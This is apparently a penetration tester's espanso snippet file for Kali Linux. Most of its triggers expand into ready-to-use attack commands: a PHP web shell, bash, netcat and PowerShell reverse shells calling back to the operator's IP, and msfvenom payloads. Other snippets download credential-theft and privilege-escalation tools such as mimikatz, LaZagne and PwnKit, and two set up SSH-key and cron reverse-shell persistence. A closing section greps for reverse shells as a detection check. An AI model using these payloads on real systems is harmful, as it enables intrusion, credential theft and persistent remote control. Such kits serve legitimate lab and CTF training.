# espanso match file

# For a complete introduction, visit the official docs at: https://espanso.org/docs/

# You can use this file to define the base matches (aka snippets)
# that will be available in every application when using espanso.
global_vars:
  - name: "IP"
    type: "shell"
    params:
      cmd: ip -o -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ip -o -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'

  - name: "ssh_key"
    type: "shell"
    params:
      cmd: "cat /home/kali/.ssh/id_rsa.pub"

    # sudo apt install xclip -y
  - name: "clipboard"
    type: "shell"
    params:
      cmd: "xclip -o"



matches:
# QOL
  - trigger: ":ip"
    replace: "{{IP}}"

  - trigger: ":clipboard"
    replace: "{{clipboard}}"
                  
# SETUP AND NMAP              
  - trigger: ":setup"                  
    replace : |          
      mkdir -p net && cd net         
      echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php
      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'\"); ?>" > rev.php
      echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'" > shell.sh
      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell86.elf &
      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf &
      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe &
      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe &
      msfvenom -p windows/powershell_reverse_tcp LHOST={{IP}} LPORT=443 -f psh
      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . & 
      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh & 
      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
      wget -q https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip && unzip SharpHound-v1.1.0.zip &
      wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
      wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
      wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit & 
      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &                                                                 
      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &                                                                  
      python3 -m http.server 80

  - trigger: ":msfwin"
    replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 -f exe -o shell.exe LHOST=

  - trigger: ":msfmwin"
    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 -f exe -o shell.exe LHOST=

  - trigger: ":msflin"
    replace: msfvenom -p linux/x64/shell_reverse_tcp LPORT=443 -f elf -o shell.elf LHOST=

  - trigger: ":msfmlin"
    replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=443 -f elf -o shell.elf LHOST=

  - trigger: ":smb"
    replace: "impacket-smbserver -smb2support share ."

  - trigger: ":pyserver"
    replace: "python3 -m http.server"

   - trigger: ":webup"
    replace: "python3 -m http.server 80"

  - trigger: ":phpserver"
    replace: "php -S 0.0.0.0:"
                                                                                
  - trigger: ":responder"
    replace: "sudo responder -I tun0"
                                                                                
  - trigger: ":nc"
    replace: nc -nvlp 443

# ENUMERATION
  - trigger: ":nmap"
    replace: sudo nmap -sC -sV -v -p- -o nmap {{clipboard}} --min-rate 

  - trigger: ":lping"
    replace: for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

  - trigger: ":wping"
    replace: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

  - trigger: ":dirsearch"
    replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u {{clipboard}}"

   - trigger: ":dirsearch2"
    replace: "dirsearch -w /usr/share/wordlists/dirb/common.txt -t 64 -e php,txt,html -f -u {{clipboard}}"   

  - trigger: ":dirsearch3"
    replace: "dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 64 -e php,txt,html -f -u {{clipboard}}"

   - trigger: ":findext"
    replace: "ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://{{clipboard}}/blog/indexFUZZ"

  - trigger: ":xfreerdp"
    replace: "xfreerdp /dynamic-resolution /cert-ignore /compression /auto-reconnect /v:{{clipboard}} /u:user /p:pass "

# REVERSE SHELLS                                                                
  # LINUX                                                                       
  - trigger: ":rcurl"                                                           
    replace: curl http://{{IP}}/shell.sh | bash
                                                                                
  - trigger: ":rwget"
    replace: wget http://{{IP}}/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
    
  - trigger: ":rbash"
    replace: bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'

  - trigger: ":mkfifo"
    replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 443 >/tmp/f
    
  # WINDOWS
  - trigger: ":rpowershell"
    replace: |
      $LHOST = "{{IP}}"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() 

# POST
  - trigger: ":pty"
    replace: |
      python3 -c 'import pty; pty.spawn("/bin/bash")' || python2 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || python2.7 -c 'import pty; pty.spawn("/bin/bash")' || python3.6 -c 'import pty; pty.spawn("/bin/bash")' || python3.5 -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null 
      export TERM=screen
      stty rows 60
      stty columns 150

  - trigger: ":tty"
    replace: |
      reset
      stty raw -echo; fg
      stty rows 60 
      stty columns 150
      export TERM=screen
    
  - trigger: ":sshpersist"
    replace: |
      mkdir -p ~/.ssh
      echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
      
  - trigger: ":cronpersist"
    replace: (crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'") | crontab -
  
  - trigger: ":wget"
    replace: wget http://{{IP}}/
    
  - trigger: ":certutil"
    replace: certutil.exe -urlcache -split -f http://{{IP}}/
  
  - trigger: ":pligolo"
    replace: sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:443

  - trigger: ":aligolo"
    replace: ./agent -connect {{IP}}:443 -ignore-cert

  - trigger: ":rligolo"
    replace: sudo ip route add 192.168.110.0/24 dev ligolo

# EXPLOITS

  - trigger: ":suid"
    replace: find / -perm -u=s -type f 2>/dev/null

  - trigger: ":root"
    replace: |
      wget http://{{IP}}/PwnKit && chmod +x PwnKit && ./PwnKit

# DEFENSE
  - trigger: ":kill"
    replace: kill -9 

  - trigger: ":pkill"
    replace: pkill -9 -t pts/

# PERSISTANCE CHECK

  - trigger: ":users"
    replace: cat /etc/passwd | grep /*sh

  - trigger: ":sshconfig"
    replace: cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|AllowUsers|PasswordAuthentication|PermitEmptyPasswords|PubkeyAuthentication" && echo -e "NO NO YES NO\nIF HARDENING RESTART SSH\nsudo systemctl restart sshd"

  - trigger: ":ftpconfig"
    replace: cat /etc/vsftpd.conf | grep -v '^\s*#' | tr -s '\n' && echo -e "\nanonymous_enable NEEDS TO BE NO\nRestart vsftpd after hardening\nsudo systemctl restart vsftpd"

  - trigger: ":cron"
    replace: echo "" && sudo find /etc/cron* -type f -exec grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|nc|netcat|bash -i|/bin/bash|python|perl|ruby|wget|curl' {} \; -exec stat -c "%A %y %n" {} \; && sudo find /var/spool/cron/crontabs -type f -exec grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|nc|netcat|bash -i|/bin/bash|python|perl|ruby|wget|curl' {} \; -exec stat -c "%A %y %n" {} \; | grep -v '^\s*#'

  - trigger: ":bashrc"
    replace: echo "" && sudo find / -name '*bashrc' -exec grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|netcat|bash -i|/bin/bash|python|perl|ruby|wget|curl' {} \; -exec stat -c "%A %y %n" {} \;    